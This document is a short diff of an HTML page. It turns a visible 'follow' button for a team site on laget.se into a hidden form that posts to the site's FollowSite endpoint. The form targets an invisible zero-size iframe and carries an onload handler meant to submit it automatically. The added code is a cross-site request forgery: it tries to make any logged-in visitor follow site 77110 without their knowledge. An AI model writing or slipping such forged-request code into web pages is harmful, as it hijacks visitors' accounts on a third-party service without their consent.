@@ -74,9 +74,10 @@
     </div>
     
     <iframe width=0 height=0 frameBorder="0" name="hidden_frame"></iframe>
-    <form action="http://www.laget.se/Common/UserMenu/FollowSite" target="hidden_frame" method="POST"><input type="submit" value="följ jeremislag! :D">
-    <input type="hidden" value="77110" name="siteId">
-    <input type="hidden" value="true" name="follow"></form>
+    <form action="http://www.laget.se/Common/UserMenu/FollowSite" target="hidden_frame" method="POST" name="followForm" onload="document.followForm.submit()">
+        <input type="hidden" value="77110" name="siteId">
+        <input type="hidden" value="true" name="follow">
+    </form>
 
     <script>
         $(function ()
